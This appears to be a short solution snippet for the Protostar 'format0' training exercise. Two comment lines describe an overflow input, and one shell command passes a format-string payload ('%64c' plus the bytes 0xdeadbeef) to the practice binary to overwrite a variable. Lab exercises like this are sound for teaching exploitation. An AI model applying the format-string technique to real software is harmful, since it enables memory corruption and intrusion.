# you could exploit it via 
# print "A" * 64 + "\xef\xbe\xad\xde" and the author asked, could we do it with less than 10 bytes
/opt/protostar/bin/format0 $(python -c "print '%64c\xef\xbe\xad\xde'")